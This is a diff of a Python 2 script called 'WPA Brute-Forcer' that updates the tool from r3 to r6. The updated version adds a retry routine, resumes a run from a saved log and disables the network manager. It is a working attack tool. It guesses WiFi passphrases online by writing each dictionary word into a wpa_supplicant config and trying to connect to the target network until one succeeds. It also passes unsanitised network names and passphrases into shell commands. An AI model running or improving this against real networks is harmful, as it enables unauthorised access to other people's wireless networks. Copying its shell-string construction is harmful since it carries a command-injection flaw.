@@ -7,11 +7,10 @@
 # Written By SYChua, syworks@gmail.com
 #
 #
-
-appver="1.0, r3"
+appver="1.0, r6"
 apptitle="WPA Brute-Forcer"
 appcreated="23 Dec 2013"
-appupdated="26 Dec 2013"
+appupdated="28 Dec 2013"
 appnote="Written By SYChua, " + appcreated + ", Updated " + appupdated
 
 class fcolor:
@@ -61,6 +60,7 @@ class fcolor:
 	CDebugB='\033[1;90m'
 	allfinal=''
 
+import string
 import requests
 import sys,os
 import subprocess
@@ -344,75 +344,165 @@ class Command(object):
 	    printd ("Process Terminated")
 
 
+def TryKey(IFACE,ConnTimeOut,resultfile,SEEKED_PASSPHRASE,ESSID):
+	ps=subprocess.Popen("ifconfig " + str(IFACE) + " down" , shell=True, stdout=subprocess.PIPE)												
+	mcmd="wpa_supplicant -Dwext -i" + str(IFACE) + " -c wpa_supplicant.conf -f " + resultfile + " > /dev/null 2>&1"
+#	mcmd="wpa_supplicant -Dwext -i" + str(IFACE) + " -c wpa_supplicant.conf"
+	printd (mcmd)
+	ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
+	command = Command(mcmd)
+	ConnTimeOut=float(ConnTimeOut)
+	command.run(timeout=ConnTimeOut)
+	FoundKey=""
+	allline=""
+	if os.path.exists(resultfile):
+		ps=subprocess.Popen("cat " + resultfile , shell=True, stdout=subprocess.PIPE)	
+		Result=ps.stdout.read()
+	#	print "File Content : " + str(Result)
+		findstr="CTRL-EVENT-CONNECTED"
+		ps=subprocess.Popen("cat " + resultfile + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
+		Result=ps.stdout.read()
+		if Result!="":
+			FoundKey="1"
+			print fcolor.BGreen + "Successful..." + fcolor.CReset + fcolor.White
+			printc ("i",fcolor.BRed + "WPA Passphrase Found !!","")
+			printc (" ",fcolor.BWhite + "ESSID\t[ " + fcolor.BRed + ESSID + fcolor.BWhite + " ]","")		
+			printc (" ",fcolor.BWhite + "Passphrase\t[ " + fcolor.BRed + str(SEEKED_PASSPHRASE) + fcolor.BWhite + " ]","")
+			return FoundKey;
+		findstr="4-Way Handshake failed - pre-shared key may be incorrect"
+		ps=subprocess.Popen("cat " + resultfile + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
+		Result=ps.stdout.read()
+		if Result!="":
+			FoundKey="0"
+			print fcolor.BRed + "Wrong Key !!" + fcolor.CReset + fcolor.White
+			return FoundKey;
+		findstr="CTRL-EVENT-DISCONNECTED"
+		ps=subprocess.Popen("cat " + resultfile + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
+		Result=ps.stdout.read()
+		if Result!="":
+			FoundKey="0"
+			print fcolor.BRed + "Wrong Key !!" + fcolor.CReset + fcolor.White
+			return FoundKey;
+	FoundKey=""
+	return FoundKey;
 
-def BeginCrack(IFACE,ESSID,DictLocation,ConnTimeOut):
-	resultfile="wpa.log"
+def BeginCrack(IFACE,ESSID,DictLocation,ConnTimeOut,LastPass):
+#	DebugMode="1"
+	global KeyTested
+	KeyTested=0
+	global TimeStart
+	global TimeStart2
+	global TimeEnd
 	printc ("H","Setting","")
 	printc (" ",fcolor.BWhite + "Interface\t: " + fcolor.BRed + str(IFACE) + fcolor.CReset,"")
 	printc (" ",fcolor.BWhite + "SSID\t: " + fcolor.BRed + str(ESSID) + fcolor.CReset,"")
-	printc (" ",fcolor.BWhite + "Dict\t: " + fcolor.BRed + str(DictLocation) + fcolor.CReset,"")
+	printc (" ",fcolor.BWhite + "Dictionary\t: " + fcolor.BRed + str(DictLocation) + fcolor.CReset,"")
 	printc (" ",fcolor.BWhite + "Timeout\t: " + fcolor.BRed + str(ConnTimeOut) + fcolor.CReset,"")
+	if LastPass!="":
+		printc (" ",fcolor.BWhite + "Last Pass\t: " + fcolor.BRed + str(LastPass) + fcolor.CReset,"")
 	print ""
 	printc ("x","Press any key to start attacking..","")
+	TimeStart2=time.strftime("%Y-%m-%d %H:%M:%S")
+	printc (".","Time Start\t: " + str(TimeStart2),"")
+	TimeStart=datetime.datetime.now()
 	printd ("Deleting Result File [ " + resultfile + " ]")
 	ps=subprocess.Popen("rm " + resultfile + " > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
-	ps=subprocess.Popen("/etc/init.d/network-manager > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
+#	ps=subprocess.Popen("/etc/init.d/network-manager status" , shell=True, stdout=subprocess.PIPE)	
+#	Result=ps.stdout.read()
+    	result=os.system("service network-manager status > /dev/null 2>&1")
+	if result==0:
+		Ask=printc ("?","Network manager is running. Disable ?","Y/n")
+		if Ask!="n" and Ask!="N":
+    			result=os.system("service network-manager stop > /dev/null 2>&1")
+			cstatus=fcolor.BWhite + "     Disabling Network Manager... "
+			print cstatus,
+			sys.stdout.flush()
+			if result==0:
+				print fcolor.BGreen + "[Done]"
+			else:
+				print fcolor.BRed + "[Failed]"
+
+			print ""
 
 	SEEKED_SSID=ESSID
 	array=[]
+	LastSeek=LastPass
 	with open(DictLocation,"r") as f:
 		for line in f:
 		    line=line.replace("\n","")
 		    sl=len(line)
 		    if sl>=8 and sl<=63:
-			SEEKED_PASSPHRASE=line
-			cstatus=fcolor.BGreen + "[.]  Trying out " + fcolor.BWhite + str(SEEKED_PASSPHRASE) + fcolor.BGreen + " .... " +  ""
-			print cstatus,
-			sys.stdout.flush()
-			ps=subprocess.Popen("wpa_passphrase " + str(ESSID) + " '" + SEEKED_PASSPHRASE + "' > wpa_supplicant.conf", shell=True, stdout=subprocess.PIPE)	
-			ps=subprocess.Popen("wpa_passphrase " + str(ESSID) + " '" + SEEKED_PASSPHRASE + "'", shell=True, stdout=subprocess.PIPE)
-			result=ps.stdout.read()
-			if DebugMode=="1":
-				print ""
-			printd (result)
+			if LastPass=="":
+				SEEKED_PASSPHRASE=line
+				cstatus=fcolor.BGreen + "[.]  Trying out " + fcolor.BWhite + str(SEEKED_PASSPHRASE) + fcolor.BGreen + " .... " +  ""
+				open(scanlog,"wb").write("ESSID::==" + str(ESSID) + "\n")
+				open(scanlog,"a+b").write("IFACE::==" + str(IFACE) + "\n")
+				open(scanlog,"a+b").write("DICT::==" + str(DictLocation) + "\n")
+				open(scanlog,"a+b").write("TIMEOUT::==" + str(ConnTimeOut) + "\n")
+				open(scanlog,"a+b").write("PASSPHRASE::==" + str(LastSeek) + "\n")
+				print cstatus,
+				sys.stdout.flush()
+				ps=subprocess.Popen("wpa_passphrase " + str(ESSID) + " '" + SEEKED_PASSPHRASE + "' > wpa_supplicant.conf", shell=True, stdout=subprocess.PIPE)	
+				ps=subprocess.Popen("wpa_passphrase " + str(ESSID) + " '" + SEEKED_PASSPHRASE + "'", shell=True, stdout=subprocess.PIPE)
+				result=ps.stdout.read()
+				if DebugMode=="1":
+					print ""
+					printd (result)
+				FoundKey=""
+				FoundKey=TryKey(IFACE,ConnTimeOut,resultfile,SEEKED_PASSPHRASE,ESSID)
+				if FoundKey=="1":
+					TimeEnd=time.strftime("%Y-%m-%d %H:%M:%S")
+					KeyTested=KeyTested +1
+					open(scanlog,"wb").write("ESSID::==" + str(ESSID) + "\n")
+					open(scanlog,"a+b").write("IFACE::==" + str(IFACE) + "\n")
+					open(scanlog,"a+b").write("DICT::==" + str(DictLocation) + "\n")
+					open(scanlog,"a+b").write("TIMEOUT::==" + str(ConnTimeOut) + "\n")
+					open(scanlog,"a+b").write("PASSPHRASE::==" + str(SEEKED_PASSPHRASE) + "\n")
+					open(scanlog,"a+b").write("<<COMPLETED>>" + "\n")
+					exit(0)
+				if FoundKey=="":
+					print fcolor.BRed + "Connection Error !!" + fcolor.CReset + fcolor.White
+					EConnTimeOut=float(ConnTimeOut)+10
+					cstatus=fcolor.BGreen + "[.]  Retrying " + fcolor.BWhite + str(SEEKED_PASSPHRASE) + fcolor.BGreen + " with " + str(EConnTimeOut) + " seconds delay.. " +  ""
+					print cstatus,
+					sys.stdout.flush()
+					printd ("")
+					FoundKey=TryKey(IFACE,EConnTimeOut,resultfile,SEEKED_PASSPHRASE,ESSID)
+					if FoundKey=="1":
+						TimeEnd=time.strftime("%Y-%m-%d %H:%M:%S")
+						KeyTested=KeyTested +1
+						open(scanlog,"wb").write("ESSID::==" + str(ESSID) + "\n")
+						open(scanlog,"a+b").write("IFACE::==" + str(IFACE) + "\n")
+						open(scanlog,"a+b").write("DICT::==" + str(DictLocation) + "\n")
+						open(scanlog,"a+b").write("TIMEOUT::==" + str(ConnTimeOut) + "\n")
+						open(scanlog,"a+b").write("PASSPHRASE::==" + str(SEEKED_PASSPHRASE) + "\n")
+						open(scanlog,"a+b").write("<<COMPLETED>>" + "\n")
+						exit(0)
+					if FoundKey=="":
+						print fcolor.BRed + "Failed !!" + fcolor.CReset + fcolor.White
+	
+	#			print "Kill WPA_Supplicant"
+				ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
+				printd ("Deleting Result File [ " + resultfile + " ]")
+				ps=subprocess.Popen("rm " + resultfile + " > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)
+	#			printc ("x","","")
+				open(scanlog,"a+b").write("PASSPHRASE::==" + str(SEEKED_PASSPHRASE) + "\n")
+				LastSeek=SEEKED_PASSPHRASE
+				KeyTested=KeyTested +1
+				time.sleep(0.5) 
+				ps=subprocess.Popen("ifdown " + str(IFACE) + " --force" , shell=True, stdout=subprocess.PIPE)												
+			if LastPass!="":
+				cstatus=fcolor.BGreen + "[.]  Locating " + fcolor.BWhite + str(LastPass) + fcolor.BGreen + "...\r"
+				print cstatus,
+				sys.stdout.flush()
+				if line==LastPass:
+					print ""
+					printc ("i","Resuming from last passphrase : " + fcolor.BRed + str(LastPass) + fcolor.BWhite + "...","")
+					LastPass=""
+	print ""
+	printc ("!!","Can't find passphrase..","")
 	
 
-			mcmd="wpa_supplicant -Dwext -i" + str(IFACE) + " -c wpa_supplicant.conf -f " + resultfile + " > /dev/null 2>&1"
-			printd (mcmd)
-			ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
-			command = Command(mcmd)
-			ConnTimeOut=float(ConnTimeOut)
-			command.run(timeout=ConnTimeOut)
-			FoundKey=""
-			allline=""
-			with open(resultfile,"r") as res:
-				for line in res:
-					allline=allline + line
-					if " 4-Way Handshake failed - pre-shared key may be incorrect" in line:
-						FoundKey="0"
-					if "CTRL-EVENT-CONNECTED" in line:
-						FoundKey="1"
-			printd ("" + allline)
-			if FoundKey=="1":
-				print fcolor.BGreen + "Successful..." + fcolor.CReset + fcolor.White
-				printc ("i",fcolor.BRed + "WPA Passphase Found !!","")
-				printc (" ",fcolor.BWhite + "ESSID\t[ " + fcolor.BRed + ESSID + fcolor.BWhite + " ]","")		
-				printc (" ",fcolor.BWhite + "Passphase\t[ " + fcolor.BRed + str(SEEKED_PASSPHRASE) + fcolor.BWhite + " ]","")
-				return
-			if FoundKey=="0":
-				print fcolor.BRed + "Wrong Key !!" + fcolor.CReset + fcolor.White
-			if FoundKey=="":
-				print fcolor.BRed + "Connection Error !!" + fcolor.CReset + fcolor.White
-			printd ("")
-			
-			printd ("Deleting Result File [ " + resultfile + " ]")
-			ps=subprocess.Popen("rm " + resultfile + " > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)
-			ps=subprocess.Popen("ifdown " + str(IFACE) + " --force" , shell=True, stdout=subprocess.PIPE)												
-
-	
-
-
-	
 
 DebugMode="0"
 os.system('clear')
@@ -420,17 +510,80 @@ cmdline=len(sys.argv)
 DisplayAppDetail()
 IFaceList=""
 WPAS="/sbin/wpa_supplicant"
+resultfile="wpa.log"
+scanlog="wpa-bruteforce.log"
+ESSID=""
+IFACE=""
+DictLocation=""
+ConnTimeOut=""
+LastPass=""
+PrevLogFound=0
+global KeyTested
+KeyTested=0
 try:
 	FE=os.path.isfile(WPAS)
+
 	if FE==True:
-		IFACE=GetInterface()
-		IFACE="wlan0"
-		ESSID=GetSSID()
-		DictLocation=GetDictLocation()
-		ConnTimeOut=GetTimeOut()	
-	 	print ""
-		Result=BeginCrack(IFACE,ESSID,DictLocation,ConnTimeOut)
-		exit(0)
+		if os.path.exists(scanlog):
+			findstr="<<COMPLETED>>"
+			ps=subprocess.Popen("cat " + scanlog + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
+			Result=ps.stdout.read()
+			if Result!="":
+				printd("Remove Previous log")
+				os.remove(scanlog)
+			else:
+				printc ("i","A previous log file was found with the following setting:","")
+				datafile = file(scanlog)
+				for line in datafile:
+					if "ESSID::==" in line:
+						line = line.replace("ESSID::==","")
+						line = line[:-1]
+						printc ("  ", fcolor.BBlue + "ESSID\t   : " + fcolor.BRed + line,"")
+						ESSID=line
+					if "IFACE::==" in line:
+						line = line.replace("IFACE::==","")
+						line = line[:-1]
+						printc ("  ",fcolor.BBlue + "Interface\t   : " + fcolor.BRed + line,"")
+						IFACE=line
+					if "DICT::==" in line:
+						line = line.replace("DICT::==","")
+						line = line[:-1]
+						printc ("  ",fcolor.BBlue + "Dictionary\t   : " + fcolor.BRed + line,"")
+						DictLocation=line
+					if "TIMEOUT::==" in line:
+						line = line.replace("TIMEOUT::==","")
+						line = line[:-1]
+						printc ("  ",fcolor.BBlue + "Timeout\t   : " + fcolor.BRed + line,"")
+						ConnTimeOut=line
+					if "PASSPHRASE::==" in line:
+						line = line.replace("PASSPHRASE::==","")
+						line = line[:-1]
+						printc ("  ",fcolor.BBlue + "Last Pass\t   : " + fcolor.BRed + line,"")
+						LastPass=line
+				print ""
+				Ask=printc("?","Continue with previous scan ?","Y/n")
+				print ""
+				if Ask=="Y" or Ask=="y" or Ask=="":
+					PrevLogFound=1
+				else:
+					LastPass=""
+					PrevLogFound=0
+
+
+		if PrevLogFound==0:
+			IFACE=GetInterface()
+			IFACE="wlan0"
+			ESSID=GetSSID()
+			DictLocation=GetDictLocation()
+			ConnTimeOut=GetTimeOut()	
+		 	print ""
+			Result=BeginCrack(IFACE,ESSID,DictLocation,ConnTimeOut,LastPass)
+			exit(0)
+		else:
+			Result=BeginCrack(IFACE,ESSID,DictLocation,ConnTimeOut,LastPass)
+			exit(0)
+			print "LastPass : " + str(LastPass)
+
 	else:
 		printc ("!!","WPA Supplicant must be installed inorder to use WPA Brute-Forcer !","")
 		exit (0)
@@ -439,4 +592,19 @@ try:
 
 except (KeyboardInterrupt, SystemExit):
     printd("KeyboardInterrupt - " + str(KeyboardInterrupt) + "\n        SystemExit - " + str(SystemExit))
-    print fcolor.BRed + "\n[!]  Session exited !!\n"
+    print fcolor.BRed + "\n\n[!]  Session exited !!"
+    if TimeStart!="":
+	print fcolor.Green + "     Started\t: " + str(TimeStart2)
+	TimeEnd=time.strftime("%Y-%m-%d %H:%M:%S")
+	print fcolor.Green + "     Time Ended\t: " + str(TimeEnd)
+	TimeEnd=datetime.datetime.now()
+	elapsedTime = TimeEnd - TimeStart
+	duration=str(elapsedTime)
+	duration=duration[:-4]
+	print "     Time Spent\t: " + str(duration)
+    if KeyTested!=0:
+	print fcolor.Green + "     Tested\t: " + fcolor.BGreen + str(KeyTested) + fcolor.Green + " passphrases."
+    else:
+	print fcolor.Green + "     Tested\t: " + fcolor.BGreen + "0" + fcolor.Green + " passphrase."
+
+    print ""
